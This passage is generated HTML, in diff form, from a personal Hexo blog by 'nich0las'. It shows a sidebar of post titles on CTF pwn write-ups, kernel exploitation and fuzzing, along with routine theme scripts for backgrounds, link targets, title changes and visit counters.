href="/2022/08/04/crafting-interpreters2/">crafting-interpreters2——scanning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/02/house-of-cat/">house-of-cat</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/29/crafting-interpreters1/">crafting_interpreters 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/28/dice2022-hope/">dice2022@hope</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/30/software-security-lab6/">software-security-lab6</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/software-security-lab5/">software-security-lab5</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/volgaCTF2022-pwn/">volgaCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/08/pyjail/">pyjail</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/angstormCTF2022-pwn/">angstormCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/04/software-security-lab4/">software-security-lab4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/27/pwnhub2022/">pwnhub2022_easyrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/25/b01lersCTF2022-pwn/">b01lersCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/15/hackpark2022-shiftycode/">hackpark2022_shiftycode</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/14/input_check_lab/">software-security-lab3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/software-security-lab2/">software-security-lab2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/matlab-2/">matlab-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/FuzzBuilder-src-understand/">FuzzBuilder_src_understand</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/SpaceHeroCTF2022-pwn-wp/">SpaceHeroCTF2022_pwn_wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/fb-bot-discord/">fb-bot_discord</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/31/matlab-1/">matlab-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/29/zer0pts2022-accountant/">zer0pts2022_accountant</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/17/fuzzing-6-grammer-fuzzing/">fuzzing-6-grammer_fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/16/fuzzing-5-parallelize/">fuzzing-5-parallelize</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/15/fuzzing-4-code_coverage/">fuzzing-4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/13/fuzzing-2/">fuzzing-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/software-security-lab1/">software-security_lab1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/fuzzing-1-gegeral-knowledge/">fuzzing-1-gegeral_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/07/umdctf2022-pwn/">umdctf2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/06/kernel-6-HijackPrctl/">kernel-6-HijackPrctl</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/02/pwnable-re-alloc-revenge/">pwnable-re-alloc_revenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/28/SUSCTF2022-pwn/">SUSCTF2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/tqlctf-nemu/">tqlctf-nemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/fastbin-reverse-into-tcache/">fastbin-reverse-into-tcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/15/kernel-5-bypass-smep1/">kernel-5-bypass_smep1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/14/pwnable-babystack/">pwnable-babystack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/11/kernel-4-doubleFetch/">kernel-4-doubleFetch</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/07/tcache-stashing-unlink-attack/">tcache-stashing-unlink-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/03/IO-file-vtable/">IO_file常见利用方法&原理(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/01/pwnable-realloc/">pwnable-realloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/31/kernel-3-UAF/">kernel-3-UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/IO-file/">IO_file常见利用方法&原理(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/largebin-attack/">largebin-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/">hws2022冬令营入营赛pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/27/RWctf-2022-svme/">RWctf-2022-svme</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/24/kernel-2-stkof/">kernel-2-stkof</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/23/kernel-1-basic_knowledge/">kernel-1-basic_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/22/Drangonctf2021-noflippidy/">Drangonctf2021-noflippidy</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/21/dicectf2021-flippidy/">dicectf2021_flippidy</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2022-2023 nich0las
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
